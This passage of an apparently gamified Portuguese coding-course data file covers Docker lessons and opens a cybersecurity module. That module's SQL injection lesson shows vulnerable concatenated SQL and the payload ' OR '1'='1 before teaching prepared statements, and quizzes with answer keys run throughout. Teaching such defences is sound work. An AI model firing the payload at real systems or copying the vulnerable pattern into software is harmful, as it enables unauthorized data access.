        "description": "Entenda a revolução dos containers, a diferença para máquinas virtuais e comandos fundamentais.",
        "duration": 15,
        "xpReward": 65,
        "language": "bash",
        "content": "# 🐳 Imagens & Containers na Estação Orbital Docker\n\nQuantas vezes você já ouviu a frase clássica: *\"Ué, mas na minha máquina funciona!\"*?\n\nDiferenças de versão de Node, bibliotecas do sistema operacional e configurações de ambiente sempre foram pesadelos para equipes de software. O **Docker** resolveu isso criando **containers**: cápsulas isoladas e portáteis que rodam com o mesmo comportamento exato em qualquer lugar.\n\n---\n\n### 📦 Container vs Máquina Virtual (VM)\n\n- **Máquinas Virtuais:** Cada VM precisa de um sistema operacional convidado (*Guest OS*) completo de vários gigabytes e inicialização lenta.\n- **Containers Docker:** Compartilham o mesmo Kernel do sistema hospedeiro, isolando apenas os processos. Por isso iniciam em **milissegundos** e gastam pouquíssima memória RAM!\n\n---\n\n### 🖼️ Imagem vs Container\n\n- **Imagem:** É a receita estática e imutável (como a planta de uma nave espacial).\n- **Container:** É a instância viva em execução criada a partir da imagem (a nave voando no espaço).\n\n---\n\n### 🚀 Comandos Essenciais do Terminal\n\n```bash\n# 1. Baixar e executar um container em segundo plano com portas mapeadas\ndocker run -d -p 8080:80 --name servidor-web nginx\n\n# 2. Listar containers que estão rodando no momento\ndocker ps\n\n# 3. Parar um container em execução\ndocker stop servidor-web\n\n# 4. Ver os logs gerados pela aplicação dentro do container\ndocker logs servidor-web\n```\n\n> **💡 Dica Pro:**\n> A flag `-p 8080:80` mapeia a **porta 8080 da sua máquina real (Host)** para a **porta 80 interna do container**. Se você esquecer essa flag, a aplicação roda, mas você não consegue acessá-la no navegador!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a flag `-d` (*detached mode*) faz o container rodar preso ao seu terminal atual, bloqueando o prompt.",
        "codeExample": "# Subindo um Banco de Dados PostgreSQL no Docker em 5 segundos\ndocker run -d \\\n  --name postgres-nexus \\\n  -e POSTGRES_PASSWORD=segredo \\\n  -p 5432:5432 \\\n  postgres:15-alpine",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que faz o parâmetro \"-p 3000:80\" no comando \"docker run -p 3000:80 meu-app\"?",
            "options": [
              "Limita o uso de memória do container para 3000 megabytes.",
              "Mapeia a porta 3000 do computador host para a porta 80 interna do container.",
              "Executa 3000 cópias simultâneas da aplicação.",
              "Define a senha de administrador do container como 3000."
            ],
            "correctIndex": 1,
            "explanation": "A sintaxe de portas no Docker é sempre -p PORTA_DO_HOST:PORTA_INTERNA_DO_CONTAINER, redirecionando o tráfego de rede entre a máquina física e a aplicação encapsulada."
          },
          {
            "type": "fillblank",
            "title": "Executando o Servidor Desacoplado",
            "instruction": "Complete o comando docker para rodar o container em segundo plano (detached mode) e mapear a porta 80.",
            "codeSnippet": "docker run -{{flag_background}} -p 80:80 --name servidor_nexus nginx",
            "blanks": [
              {
                "id": "flag_background",
                "placeholder": "flag de segundo plano",
                "expectedValues": [
                  "d"
                ],
                "hint": "Letra única que ativa o Detached Mode (segundo plano)."
              }
            ],
            "explanation": "Perfeito! A flag -d libera seu terminal imediatamente enquanto o container segue operando em background."
          }
        ]
      },
      {
        "id": "docker-2",
        "title": "2. A Receita Espacial: Construindo Dockerfiles",
        "description": "Crie suas próprias imagens Docker profissionais com cache de camadas e boas práticas de build.",
        "duration": 16,
        "xpReward": 65,
        "language": "dockerfile",
        "content": "# 📜 Construindo Dockerfiles Profissionais\n\nPara empacotar a sua própria aplicação dentro de uma imagem Docker, você escreve um arquivo de instruções chamado **`Dockerfile`**.\n\n---\n\n### 🧱 Anatomia de um Dockerfile para Node.js\n\n```dockerfile\n# 1. Imagem base oficial do Node.js leve (versão alpine)\nFROM node:18-alpine\n\n# 2. Diretório de trabalho dentro do container\nWORKDIR /app\n\n# 3. Copiar manifestos de dependências primeiro (otimização de cache!)\nCOPY package*.json ./\n\n# 4. Instalar dependências\nRUN npm install --production\n\n# 5. Copiar o restante do código fonte\nCOPY . .\n\n# 6. Informar qual porta o container escuta\nEXPOSE 3000\n\n# 7. Comando padrão para ligar o servidor\nCMD [\"node\", \"server.js\"]\n```\n\n---\n\n### ⚡ O Segredo do Cache de Camadas (*Layer Caching*)\n\nCada instrução (`RUN`, `COPY`, `WORKDIR`) cria uma camada imutável no Docker.\n- Se o seu código mudar, mas suas dependências continuarem iguais, o Docker reutiliza o cache do `npm install`!\n- Por isso, copiamos o `package.json` antes de copiar todo o código (`COPY . .`). Isso reduz o tempo de deploy de minutos para segundos!\n\n> **💡 Dica Pro:**\n> Crie sempre um arquivo `.dockerignore` excluindo a pasta `node_modules` e arquivos `.env`. Isso impede que pastas pesadas locais poluam o build da imagem.\n\n> **⚠️ Armadilha Comum:**\n> Confundir `RUN` com `CMD`. O `RUN` é executado **durante a construção da imagem** (ex: instalar pacotes). O `CMD` é executado **quando o container é ligado**!",
        "codeExample": "# Dockerfile Otimizado para Produção\nFROM node:20-alpine\nWORKDIR /usr/src/app\nCOPY package*.json ./\nRUN npm ci --only=production\nCOPY . .\nEXPOSE 8080\nCMD [\"npm\", \"start\"]",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual instrução do Dockerfile é responsável por definir qual imagem de partida oficial será utilizada como base do container?",
            "options": [
              "ORIGIN",
              "FROM",
              "BASE_IMAGE",
              "IMPORT"
            ],
            "correctIndex": 1,
            "explanation": "Todo Dockerfile começa com a instrução FROM especificando a imagem base (ex: FROM node:18-alpine ou FROM python:3.11-slim)."
          },
          {
            "type": "code",
            "instruction": "Escreva um Dockerfile básico iniciando com a imagem base node:18-alpine, definindo o diretório de trabalho /app e o comando de inicialização CMD [\"node\", \"app.js\"].",
            "initialCode": "# Escreva as instruções do Dockerfile abaixo\n",
            "expectedKeywords": [
              "FROM node:18-alpine",
              "WORKDIR /app",
              "CMD [\"node\", \"app.js\"]"
            ],
            "hint": "Escreva: FROM node:18-alpine, depois WORKDIR /app e finalize com CMD [\"node\", \"app.js\"].",
            "solution": "FROM node:18-alpine\nWORKDIR /app\nCMD [\"node\", \"app.js\"]"
          }
        ]
      },
      {
        "id": "docker-3",
        "title": "3. Mapeamento de Portas e Redes Isoladas",
        "description": "Conecte serviços espaciais com o parâmetro -p (host:container) e crie redes bridge isoladas com docker network.",
        "duration": 15,
        "xpReward": 65,
        "language": "dockerfile",
        "content": "# 🌐 Mapeamento de Portas e Redes Isoladas\n\nEstação Orbital Docker em prontidão! Por padrão, um container é uma fortaleza selada: ele possui sua própria interface de rede, pilha de IPs e portas totalmente invisíveis para a máquina hospedeira (*Host*).\n\n> **💡 O Mapeamento de Portas (-p host:container)**\n> Para que você consiga acessar no navegador do seu computador uma aplicação web rodando dentro de um container, é necessário criar um túnel de redirecionamento de portas através da flag `-p`:\n> `-p <Porta_Da_Sua_Maquina>:<Porta_De_Dentro_Do_Container>`\n\n---\n\n### 🔌 Publicando Portas na Prática\n\n```bash\n# Mapeia a porta 8080 do seu PC para a porta 80 do Nginx dentro do container:\ndocker run -d -p 8080:80 --name servidor-web nginx\n```\n\nAgora, ao acessar `http://localhost:8080` no seu navegador, a requisição é interceptada pelo Docker e direcionada à porta `80` interna do container!\n\n---\n\n### 🕸️ Redes Isoladas com `docker network`\n\nNunca conecte containers entre si usando IPs manuais voláteis! Criamos uma rede virtual com DNS interno automático:\n\n```bash\n# 1. Cria a rede bridge isolada:\ndocker network create rede-nexus\n\n# 2. Roda o banco na rede:\ndocker run -d --name banco-dados --network rede-nexus postgres\n\n# 3. Roda a API na mesma rede:\ndocker run -d --name api-backend --network rede-nexus -p 3000:3000 minha-api\n```\n\nA mágica acontece: dentro da `api-backend`, a URL de conexão com o banco é simplesmente `postgres://banco-dados:5432`! O Docker resolve o nome do container pelo DNS interno automaticamente.\n\n> **⚠️ Armadilha Comum:**\n> Inverter a ordem das portas na flag `-p`. A ordem é SEMPRE `host:container`. Se você digitar `-p 80:8080`, estará tentando ouvir a porta 80 do seu PC e enviando para a 8080 do container!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Nunca exponha a porta de bancos de dados diretamente para o mundo exterior (`-p 5432:5432`) em ambientes de produção. O banco deve conversar apenas na rede interna com a API.\n- Isole aplicações diferentes em redes Docker separadas para evitar comunicação lateral indevida.\n\n> **🛡️ Regra de Ouro:**\n> Utilize redes Docker customizadas para usufruir da resolução automática de nomes por DNS entre containers.",
        "codeExample": "# Criação de rede e inicialização conjunta\ndocker network create frota-net\ndocker run -d --network frota-net --name redis-cache redis:alpine",
        "exercises": [
          {
            "type": "quiz",
            "question": "No comando \"docker run -p 3000:80 meu-app\", qual porta será aberta no computador host e qual porta receberá o tráfego dentro do container?",
            "options": [
              "Porta 80 no host e porta 3000 no container.",
              "Porta 3000 no computador host e porta 80 internamente no container.",
              "O comando cria 3000 cópias do container na porta 80.",
              "Ambas as portas são abertas exclusivamente na memória RAM."
            ],
            "correctIndex": 1,
            "explanation": "A convenção do Docker na flag -p é sempre HOST:CONTAINER (porta externa : porta interna)."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando Docker para criar uma nova rede com o driver padrão chamada \"rede-nexus\".",
            "initialCode": "# Digite o comando de criação de rede aqui\n",
            "expectedKeywords": [
              "docker network create rede-nexus"
            ],
            "hint": "Use: docker network create rede-nexus",
            "solution": "docker network create rede-nexus"
          }
        ]
      },
      {
        "id": "docker-4",
        "title": "4. Persistência de Dados com Volumes Docker",
        "description": "Evite a perda de bancos de dados e relatórios entendendo a camada de escrita efêmera e os Volumes persistentes.",
        "duration": 16,
        "xpReward": 65,
        "language": "dockerfile",
        "content": "# 💾 Persistência de Dados com Volumes Docker\n\nPreservação vital na Estação Orbital Docker! Por padrão, containers são **efêmeros** e descartáveis: se um container for destruído com `docker rm`, todos os dados gravados no seu disco interno evaporam junto com ele!\n\n> **💡 O que é um Docker Volume?**\n> Um Volume é um mecanismo de armazenamento gerenciado pelo Docker fora do ciclo de vida dos containers. Ele fica guardado com segurança no sistema de arquivos do host e sobrevive à destruição e reinicialização de containers.\n\n---\n\n### 🗄️ Volumes Gerenciados vs Bind Mounts\n\n1. **Named Volumes (Volumes Nomeados):** O Docker gerencia onde os arquivos ficam guardados no disco (ideal para bancos de dados):\n```bash\n# Cria o volume\ndocker volume create dados-postgres\n\n# Monta o volume na pasta do PostgreSQL com a flag -v\ndocker run -d --name meu-banco -v dados-postgres:/var/lib/postgresql/data postgres\n```\n\n2. **Bind Mounts:** Mapeia uma pasta específica do seu código-fonte local diretamente para dentro do container (ideal para ambiente de desenvolvimento com live-reload):\n```bash\n# Monta a pasta atual (.) dentro do container em /app:\ndocker run -d -p 3000:3000 -v $(pwd):/app minha-api-dev\n```\n\n---\n\n### 🧹 Comandos de Gestão de Volumes\n\n```bash\n# Listar volumes existentes\ndocker volume ls\n\n# Inspecionar detalhes de onde o volume está montado\ndocker volume inspect dados-postgres\n\n# Deletar volumes órfãos que não estão sendo usados por ninguém\ndocker volume prune\n```\n\n> **⚠️ Armadilha Comum:**\n> Rodar um container de banco de dados em produção sem volume montado! Na primeira atualização de versão ou reinicialização do container, todos os cadastros e dados dos usuários serão irremediavelmente perdidos!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use sempre Named Volumes em produção para evitar acoplamento com caminhos específicos do sistema de arquivos do host.\n- Crie rotinas periódicas de backup dos diretórios de volume.\n\n> **🛡️ Regra de Ouro:**\n> Trate seus containers como gado (descartáveis e substituíveis), e seus volumes como animais de estimação (preciosos e permanentes).",
        "codeExample": "# Inicializando banco com persistência garantida\ndocker volume create nexus-db-data\ndocker run -d --name db -v nexus-db-data:/var/lib/postgresql/data -e POSTGRES_PASSWORD=segredo postgres:15-alpine",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que acontece com os dados gravados em um banco de dados rodando dentro de um container sem volume montado caso o container seja excluído com \"docker rm\"?",
            "options": [
              "Os dados são salvos automaticamente no GitHub.",
              "Os dados são completamente perdidos, pois a camada de escrita do container é efêmera.",
              "O Docker cria uma imagem de backup na pasta /tmp.",
              "O banco continua rodando em segundo plano no kernel do Linux."
            ],
            "correctIndex": 1,
            "explanation": "A camada de escrita de um container é temporária; sem um volume persistente montado, qualquer dado gravado desaparece com a remoção do container."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando Docker para criar um novo volume chamado \"meu-volume\".",
            "initialCode": "# Crie o volume aqui\n",
            "expectedKeywords": [
              "docker volume create meu-volume"
            ],
            "hint": "Use: docker volume create meu-volume",
            "solution": "docker volume create meu-volume"
          }
        ]
      },
      {
        "id": "docker-5",
        "title": "5. Multi-Containers com Docker Compose",
        "description": "Orquestre arquiteturas completas (API + Banco + Cache) com um único arquivo declarativo docker-compose.yml.",
        "duration": 17,
        "xpReward": 65,
        "language": "dockerfile",
        "content": "# 🐙 Multi-Containers com Docker Compose\n\nOrquestração de frotas na Estação Orbital Docker! Em projetos reais, uma aplicação raramente vive sozinha: ela depende de um backend, um banco PostgreSQL, um cache Redis e um frontend. Digitar 15 comandos `docker run` gigantescos toda vez é inviável. É aqui que entra o **Docker Compose**.\n\n> **💡 O que é Docker Compose?**\n> É uma ferramenta que permite definir e executar múltiplos containers integrados a partir de um único arquivo de configuração declarativo no formato YAML (`docker-compose.yml`).\n\n---\n\n### 📜 A Anatomia de um `docker-compose.yml`\n\n```yaml\nversion: '3.8'\n\nservices:\n  api:\n    build: .\n    ports:\n      - \"3000:3000\"\n    environment:\n      - DATABASE_URL=postgres://cadete:segredo@banco:5432/nexus\n    depends_on:\n      - banco\n    networks:\n      - nexus-net\n\n  banco:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_USER: cadete\n      POSTGRES_PASSWORD: segredo\n      POSTGRES_DB: nexus\n    volumes:\n      - dados-banco:/var/lib/postgresql/data\n    networks:\n      - nexus-net\n\nvolumes:\n  dados-banco:\n\nnetworks:\n  nexus-net:\n```\n\n---\n\n### 🕹️ Os Comandos Mestres do Compose\n\n```bash\n# 1. Sobe todos os containers, cria redes e volumes em segundo plano:\ndocker compose up -d\n\n# 2. Visualiza os logs unificados de todos os serviços em tempo real:\ndocker compose logs -f\n\n# 3. Derruba toda a infraestrutura com segurança (sem apagar os volumes):\ndocker compose down\n\n# 4. Derruba e apaga também os volumes (limpeza total):\ndocker compose down -v\n```\n\n> **⚠️ Armadilha Comum:**\n> Identação incorreta no arquivo YAML! Arquivos YAML usam espaços estritos (nunca use a tecla Tab!). Um espaço desalinhado invalida a estrutura inteira do compose.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use `depends_on` para garantir a ordem de inicialização correta (ex: a API só inicia após o banco estar de pé).\n- Utilize variáveis de ambiente compartilhadas com um arquivo `.env` na mesma pasta do compose.\n\n> **🛡️ Regra de Ouro:**\n> O comando `docker compose up` deve ser a única instrução necessária para um novo desenvolvedor colocar o projeto inteiro rodando em sua máquina.",
        "codeExample": "# Subindo a aplicação inteira em um comando\ndocker compose up --build -d",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual comando do Docker Compose é utilizado para inicializar todos os serviços definidos no docker-compose.yml em segundo plano (detached mode)?",
            "options": [
              "docker compose start -b",
              "docker compose up -d",
              "docker compose run --all",
              "docker compose launch"
            ],
            "correctIndex": 1,
            "explanation": "O comando docker compose up -d compila, cria redes, volumes e sobe todos os serviços em segundo plano (detached mode)."
          },
          {
            "type": "code",
            "instruction": "Escreva o comando do Docker Compose para parar e remover todos os containers e redes criados pelo compose.",
            "initialCode": "# Digite o comando down aqui\n",
            "expectedKeywords": [
              "docker compose down"
            ],
            "hint": "Use: docker compose down",
            "solution": "docker compose down"
          }
        ]
      },
      {
        "id": "docker-6",
        "title": "6. Builds Otimizados com Multi-Stage Builds",
        "description": "Reduza imagens de 1.5GB para menos de 50MB separando ambiente de compilação pesada do runtime de produção.",
        "duration": 16,
        "xpReward": 65,
        "language": "dockerfile",
        "content": "# ✂️ Builds Otimizados com Multi-Stage Builds\n\nEngenharia de miniaturização na Estação Orbital Docker! Se você compila uma aplicação Node.js, Go ou Rust dentro do Docker, sua imagem final não precisa conter compiladores, caches de pacotes e ferramentas de desenvolvimento pesadas. Com **Multi-Stage Builds**, reduzimos o tamanho da imagem em até 95%!\n\n> **💡 O que é Multi-Stage Build?**\n> É uma técnica no Dockerfile que utiliza múltiplas instruções `FROM`. Cada estágio pode herdar uma base diferente, e você copia **apenas o artefato compilado final** do estágio anterior para a imagem definitiva.\n\n---\n\n### 🚀 Exemplo Clássico com Node.js e TypeScript\n\n```dockerfile\n# ---------------------------------------------\n# ESTÁGIO 1: Construção e Compilação (Builder)\n# ---------------------------------------------\nFROM node:18-alpine AS builder\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\nCOPY . .\nRUN npm run build\n# Aqui temos TypeScript, linters e 800MB de devDependencies\n\n# ---------------------------------------------\n# ESTÁGIO 2: Imagem Definitiva de Produção\n# ---------------------------------------------\nFROM node:18-alpine AS runner\nWORKDIR /app\nENV NODE_ENV=production\n\nCOPY package*.json ./\nRUN npm ci --only=production\n\n# Copia APENAS o código JavaScript transpilado do estágio builder!\nCOPY --from=builder /app/dist ./dist\n\nEXPOSE 3000\nCMD [\"node\", \"dist/main.js\"]\n```\n\n---\n\n### 🛡️ Benefícios em Dobro: Performance & Segurança\n\n1. **Velocidade de Deploy:** Imagens leves baixam em 3 segundos no cluster Kubernetes em vez de demorar minutos.\n2. **Superfície de Ataque Reduzida:** Sem compiladores ou ferramentas adicionais no container final, invasores têm muito menos brechas para explorar!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de nomear o primeiro estágio com `AS builder`. Sem a etiqueta de nome, você teria que referenciar o estágio por índice numérico (`--from=0`), o que torna o Dockerfile confuso e frágil a alterações.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use imagens base minimalistas como `alpine` ou `distroless` no estágio final.\n- Configure um arquivo `.dockerignore` robusto excluindo `node_modules`, `.git` e arquivos de log para acelerar o contexto do build.\n\n> **🛡️ Regra de Ouro:**\n> O container de produção deve conter estritamente o necessário para executar a aplicação, nada além disso.",
        "codeExample": "# .dockerignore essencial\nnode_modules\ndist\n.git\n.env",
        "exercises": [
          {
            "type": "quiz",
            "question": "No Multi-Stage Build do Dockerfile, como indicamos que queremos copiar um arquivo compilado a partir de um estágio anterior chamado \"builder\"?",
            "options": [
              "COPY --stage=builder /app/dist ./dist",
              "COPY --from=builder /app/dist ./dist",
              "IMPORT FROM builder /app/dist",
              "GET /builder/app/dist ./dist"
            ],
            "correctIndex": 1,
            "explanation": "A instrução COPY aceita a flag --from=<nome_do_estagio> para extrair artefatos gerados em etapas anteriores."
          },
          {
            "type": "fillblank",
            "title": "Definindo um Estágio de Build Nomeado",
            "instruction": "Preencha a palavra-chave que dá um apelido ao estágio de build no Dockerfile.",
            "codeSnippet": "FROM node:18-alpine ___ compilador\nWORKDIR /app",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "palavra de apelido",
                "expectedValues": [
                  "AS",
                  "as"
                ],
                "hint": "A instrução de duas letras usada para nomear o estágio (como em aliases SQL)."
              }
            ],
            "explanation": "A instrução FROM imagem AS nome define um estágio nomeado reutilizável por etapas subsequentes."
          }
        ]
      },
      {
        "id": "docker-7",
        "title": "7. Variáveis de Ambiente e Arquivos .env no Container",
        "description": "Configure dinamicamente containers em tempo de execução usando flags -e, env_file e boas práticas de segredos.",
        "duration": 15,
        "xpReward": 65,
        "language": "dockerfile",
        "content": "# 🔐 Variáveis de Ambiente e Arquivos .env no Container\n\nParametrização estelar na Estação Orbital Docker! Uma imagem Docker deve ser **imutável e universal**: a mesmíssima imagem que roda no computador do desenvolvedor deve ser a que roda nos servidores de teste e de produção. A única coisa que muda entre esses ambientes são as **configurações injetadas via variáveis de ambiente**.\n\n> **💡 Como Injetar Variáveis no Docker**\n> - **Na linha de comando**: `-e CHAVE=VALOR`\n> - **Através de um arquivo**: `--env-file .env.prod`\n> - **No Docker Compose**: seção `environment:` ou diretiva `env_file:`\n\n---\n\n### 🕹️ Injeção na Prática\n\n```bash\n# 1. Injetando variável única com a flag -e:\ndocker run -d -p 8080:8080 -e PORTA=8080 -e AMBIENTE=producao minha-imagem\n\n# 2. Injetando dezenas de variáveis a partir de um arquivo .env seguro:\ndocker run -d --env-file .env.producao minha-imagem\n```\n\n---\n\n### 🧩 A Diferença Entre `ARG` e `ENV` no Dockerfile\n\nEssa é uma das dúvidas mais frequentes na academia:\n- **`ARG` (Build-time)**: Disponível **apenas durante a construção da imagem** (`docker build`). Não existe quando o container está rodando!\n- **`ENV` (Runtime)**: Fica gravada na imagem e **permanece ativa durante a execução do container** (`docker run`).\n\n```dockerfile\n# Disponível apenas no build:\nARG VERSAO_APP=1.0.0\n\n# Disponível para a aplicação rodar em produção:\nENV NODE_ENV=production\nENV PORT=3000\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar `ENV` ou `ARG` para passar senhas de banco ou chaves privadas durante o `docker build`! As variáveis de build ficam gravadas nas camadas históricas da imagem e podem ser lidas por qualquer um com `docker history`. Para segredos de build, use `BuildKit Secrets` (`--mount=type=secret`).\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Defina valores padrão razoáveis no Dockerfile com `ENV`, mas permita que eles sejam sobrescritos na inicialização do container.\n- Adicione o arquivo `.env` ao seu `.gitignore` e ao seu `.dockerignore` para garantir que segredos nunca sejam comitados ou embutidos na imagem.\n\n> **🛡️ Regra de Ouro:**\n> O código é estático e compartilhado; a configuração é dinâmica e isolada por ambiente.",
        "codeExample": "# Executando container com injeção de arquivo de ambiente\ndocker run -d --name api --env-file .env.producao -p 80:3000 api-nexus:v1",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a diferença fundamental entre a instrução ARG e a instrução ENV dentro de um Dockerfile?",
            "options": [
              "ARG roda em computadores Apple e ENV em computadores Linux.",
              "ARG só tem efeito durante o build da imagem, enquanto ENV persiste e fica disponível como variável de ambiente em tempo de execução no container.",
              "ENV só aceita números inteiros.",
              "ARG é obrigatória em todos os Dockerfiles."
            ],
            "correctIndex": 1,
            "explanation": "ARG define parâmetros passageiros de construção da imagem, enquanto ENV define variáveis que perduram durante a execução dos containers."
          },
          {
            "type": "code",
            "instruction": "Escreva a instrução Dockerfile para definir a variável de ambiente em tempo de execução \"NODE_ENV\" com o valor \"production\".",
            "initialCode": "# Defina a instrução ENV aqui\n",
            "expectedKeywords": [
              "ENV NODE_ENV=production"
            ],
            "hint": "Use: ENV NODE_ENV=production",
            "solution": "ENV NODE_ENV=production"
          }
        ]
      },
      {
        "id": "docker-8",
        "title": "8. Boas Práticas, Segurança e Imagens Leves (Alpine)",
        "description": "Blinde containers corporativos executando sem root (USER non-root), healthchecks e escaneamento de vulnerabilidades.",
        "duration": 17,
        "xpReward": 70,
        "language": "dockerfile",
        "content": "# 🛡️ Boas Práticas, Segurança e Imagens Leves (Alpine)\n\nMissão final na Estação Orbital Docker! Colocar um container para rodar é fácil; colocá-lo em produção cumprindo os padrões internacionais de segurança cibernética e alta disponibilidade é o que distingue os arquitetos da frota.\n\n> **💡 O Perigo de Rodar como Root**\n> Por padrão, se você não especificar um usuário no Dockerfile, o processo dentro do container executa como **root** (UID 0). Se um invasor explorar uma vulnerabilidade na sua aplicação, ele terá privilégios de superusuário dentro do container e poderá tentar escapar para o sistema operacional hospedeiro (*Container Escape*)!\n\n---\n\n### 🛡️ O Padrão do Usuário Não-Privilegiado (`USER`)\n\n```dockerfile\nFROM node:18-alpine\n\nWORKDIR /app\n\n# Cria um grupo e um usuário de sistema sem privilégios:\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\n\nCOPY --chown=appuser:appgroup package*.json ./\nRUN npm ci --only=production\n\nCOPY --chown=appuser:appgroup . .\n\n# MUDA PARA O USUÁRIO SEGURO antes de rodar a aplicação!\nUSER appuser\n\nEXPOSE 3000\nCMD [\"node\", \"server.js\"]\n```\n\n---\n\n### 💓 Verificação de Saúde Automática (`HEALTHCHECK`)\n\nEnsine o Docker e o Kubernetes a verificar se sua aplicação travou:\n\n```dockerfile\nHEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3   CMD wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1\n```\n\nSe o endpoint `/health` falhar por 3 vezes seguidas, o status do container muda para `(unhealthy)` e o orquestrador reinicia o serviço automaticamente!\n\n---\n\n### 🔍 Auditoria de Vulnerabilidades com Docker Scout\n\n```bash\n# Escaneia a imagem em busca de vulnerabilidades e CVEs conhecidas:\ndocker scout quickview minha-imagem:v1\ndocker scout cves minha-imagem:v1\n```\n\n> **⚠️ Armadilha Comum:**\n> Usar a tag `:latest` em ambientes de produção! A tag latest é mutável: amanhã ela pode apontar para uma versão incompatível que quebra seu deploy. Em produção, use sempre tags imutáveis com a versão exata (`:1.4.2`).\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Escolha bases Alpine ou Distroless: além de minúsculas, elas possuem dezenas de utilitários vulneráveis a menos instalados.\n- Torne o sistema de arquivos do container somente leitura em runtime quando possível com a flag `--read-only`.\n\n> **🛡️ Regra de Ouro:**\n> \"Princípio do Menor Privilégio\": containers nunca devem rodar como root em produção.",
        "codeExample": "# Verificando saúde do container\ndocker ps --filter \"health=healthy\"",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que é uma boa prática de segurança configurar uma instrução USER com usuário não-root no final do Dockerfile?",
            "options": [
              "Porque o usuário root gasta 1GB a mais de memória RAM.",
              "Para mitigar riscos de segurança, impedindo que uma invasão na aplicação dê ao atacante controle de superusuário no container ou no host.",
              "Porque o Docker não permite conexões de rede em containers root.",
              "Para forçar o container a usar a placa de vídeo."
            ],
            "correctIndex": 1,
            "explanation": "Executar com usuário não-privilegiado restringe os danos em caso de brechas e reduz a superfície de ataques de escape de container."
          },
          {
            "type": "code",
            "instruction": "Escreva a instrução Dockerfile que define o usuário de execução do container para \"node\" (usuário padrão não-root da imagem oficial).",
            "initialCode": "# Defina a instrução USER aqui\n",
            "expectedKeywords": [
              "USER node"
            ],
            "hint": "Use: USER node",
            "solution": "USER node"
          }
        ]
      }
    ]
  },
  {
    "id": "ciberseguranca",
    "slug": "ciberseguranca",
    "name": "Cibersegurança",
    "planetName": "Shadow Grid",
    "description": "Aprenda as técnicas dos hackers éticos: blindagem contra invasões, OWASP Top 10 e proteção de dados.",
    "icon": "🛡️",
    "color": "#00E5FF",
    "language": "javascript",
    "level": "Intermediário",
    "totalXp": 525,
    "lessons": [
      {
        "id": "sec-1",
        "title": "1. O Vetor de Invasão: SQL Injection & Sanitização",
        "description": "Descubra como ataques de injeção funcionam e como blindar sistemas com Prepared Statements.",
        "duration": 16,
        "xpReward": 65,
        "language": "sql",
        "content": "# 🛡️ SQL Injection & Sanitização na Shadow Grid\n\nBem-vindo à **Shadow Grid**, a divisão de defesa cibernética e operações de segurança ética do Nexus!\n\nDentre todas as ameaças catalogadas pela fundação **OWASP** (*Open Web Application Security Project*), o **SQL Injection** foi a vulnerabilidade que causou os maiores vazamentos de bancos de dados da história da internet.\n\n---\n\n### 💣 A Anatomia do Ataque\n\nImagine um backend ingênuo que monta a consulta SQL concatenando diretamente o que o usuário digita no campo de login:\n\n```javascript\n// ❌ CÓDIGO VULNERÁVEL:\nconst query = \"SELECT * FROM usuarios WHERE email = '\" + emailDigitado + \"'\";\n```\n\nSe um atacante digitar no campo de e-mail o seguinte payload:\n```text\n' OR '1'='1\n```\n\nA consulta final executada no banco de dados se transforma em:\n```sql\nSELECT * FROM usuarios WHERE email = '' OR '1'='1'\n```\nComo `'1'='1'` é sempre verdadeiro, o banco devolve **todos os usuários da aplicação**, garantindo acesso irrestrito ao invasor sem senha!\n\n---\n\n### 🛡️ O Antídoto: Prepared Statements (Consultas Parametrizadas)\n\nA regra de ouro da cibersegurança: **nunca confie na entrada do usuário**.\n\nCom **Prepared Statements**, o banco de dados compila o comando SQL primeiro, e os dados do usuário são enviados separadamente como parâmetros puros. O texto digitado jamais será interpretado como instrução SQL:\n\n```javascript\n// ✅ CÓDIGO BLINDADO COM PARÂMETROS ($1, $2 ou ?):\nconst query = \"SELECT * FROM usuarios WHERE email = $1 AND senha_hash = $2\";\nawait db.query(query, [emailDigitado, hashCalculado]);\n```\n\n> **💡 Dica Pro:**\n> ORMs e bibliotecas modernas (como Prisma, Supabase, Drizzle, Hibernate) já utilizam Prepared Statements nativamente por baixo dos panos, protegendo você por padrão.\n\n> **⚠️ Armadilha Comum:**\n> Fazer validação de segurança apenas no frontend (formulário HTML ou React) não protege nada! O atacante pode enviar requisições diretas via terminal usando `curl` ignorando completamente suas travas visuais.",
        "codeExample": "// Autenticação Segura Contra Injeção SQL\nimport { pool } from './database';\n\nasync function autenticarCadete(email, senhaHash) {\n  // O parâmetro $1 isola os dados de qualquer tentativa de injeção\n  const resultado = await pool.query(\n    'SELECT id, username, role FROM users WHERE email = $1 AND password_hash = $2',\n    [email, senhaHash]\n  );\n  return resultado.rows[0] || null;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que o uso de Consultas Parametrizadas (Prepared Statements) impede com eficácia ataques de SQL Injection?",
            "options": [
              "Porque criptografa o banco de dados com uma chave militar de 512 bits.",
              "Porque separa o código SQL estrutural dos dados de entrada, garantindo que o texto do usuário seja tratado estritamente como dado literal e nunca como comando executável.",
              "Porque impede que o usuário digite caracteres especiais no teclado.",
              "Porque fecha as portas de rede do servidor enquanto a busca é realizada."
            ],
            "correctIndex": 1,
            "explanation": "Nas Prepared Statements, o motor do banco de dados compila o plano de execução antes de receber os valores, impossibilitando que comandos maliciosos injetados alterem a lógica da consulta."
          },
          {
            "type": "bughunt",
            "title": "Injeção SQL Crítica no Login",
